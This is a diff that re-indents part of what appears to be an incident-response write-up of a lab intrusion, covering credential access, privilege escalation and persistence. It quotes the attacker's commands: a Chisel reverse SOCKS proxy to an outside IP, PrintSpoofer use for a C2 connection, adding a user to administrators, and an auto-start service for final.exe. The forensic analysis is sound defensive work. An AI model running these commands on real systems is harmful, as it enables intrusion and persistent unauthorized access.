@@ -65,30 +65,30 @@ The technical artefacts of the attack are covered by this report along with a cl
  
 ### Phase 5: Discovery, Credential Access
 * **Investigation Continues**
-* After going through more encoded commands that were executed by the attacker, it was discovered that the attacker had found sensitive information such as the `[REDACTED]` user password,  via a powershell scripted titled `automation.ps1`.
-* The attacker had enumerated the listening ports inside the machine, and utilized the port `5985` (WinRM) to establish a remote shell connection.
-* After enumerating the listening ports, the attacker established a reverse socks proxy for access to the internal services inside the machine using the following command: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
-  * Hash of binary `ch.exe`: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
-* After utilizing some OSINT (VirusTotal) on the hash above, it was discovered that the attacker made use of the tool `Chisel`.
-* The attacker then used the previously mentioned `WinRM` tied to the port `5985` to authenticate and interact with the system.
+  * After going through more encoded commands that were executed by the attacker, it was discovered that the attacker had found sensitive information such as the `[REDACTED]` user password,  via a powershell scripted titled `automation.ps1`.
+  * The attacker had enumerated the listening ports inside the machine, and utilized the port `5985` (WinRM) to establish a remote shell connection.
+  * After enumerating the listening ports, the attacker established a reverse socks proxy for access to the internal services inside the machine using the following command: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
+    * Hash of binary `ch.exe`: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
+  * After utilizing some OSINT (VirusTotal) on the hash above, it was discovered that the attacker made use of the tool `Chisel`.
+  * The attacker then used the previously mentioned `WinRM` tied to the port `5985` to authenticate and interact with the system.
 
 ### Phase 6: Privilege Escalation
 * **Investigation Continues**
-* The attacker proceeded to download another binary, titled `spf.exe`, for privilege escalation.
-  * Hash of binary `spf.exe`: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
-* Using OSINT (VirusTotal) on the binary above revealed the tool to be `PrintSpoofer`. This tool is used to escalate the user's privileges to `NT AUTHORITY/SYSTEM`
-* The attacker used `PrintSpoofer` to exploit a specific privilege owned by the user, `SeImpersonatePrivilege`, for privilege escalation.
-* The attacker executed the `PrintSpoofer` tool with another binary, titled `final.exe`, to establish a C2 connection over the port `8080`.
+  * The attacker proceeded to download another binary, titled `spf.exe`, for privilege escalation.
+    * Hash of binary `spf.exe`: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
+  * Using OSINT (VirusTotal) on the binary above revealed the tool to be `PrintSpoofer`. This tool is used to escalate the user's privileges to `NT AUTHORITY/SYSTEM`
+  * The attacker used `PrintSpoofer` to exploit a specific privilege owned by the user, `SeImpersonatePrivilege`, for privilege escalation.
+  * The attacker executed the `PrintSpoofer` tool with another binary, titled `final.exe`, to establish a C2 connection over the port `8080`.
 
 ### Phase 7: Action on Objectives
 * **Investigation Continues**
-* After gaining administrative privileges, the attacker created two users `shion` and `shuna`, likely to establish persistence.
-  * Detected via Event ID `4720`
-* The attacker proceeded to attempt to add one of the users they created, `shion` to the administrators group.
-  * Command used by the attacker: `net localgroup administrators /add shion`
-  * Event ID: `4732`
-* Finally, the user executed a command to establish permanent persistence on the compromised machine via the command:
-  * `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
+  * After gaining administrative privileges, the attacker created two users `shion` and `shuna`, likely to establish persistence.
+    * Detected via Event ID `4720`
+  * The attacker proceeded to attempt to add one of the users they created, `shion` to the administrators group.
+    * Command used by the attacker: `net localgroup administrators /add shion`
+    * Event ID: `4732`
+  * Finally, the user executed a command to establish permanent persistence on the compromised machine via the command:
+    * `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
 
 ## MITRE ATT&CK Mapping
 
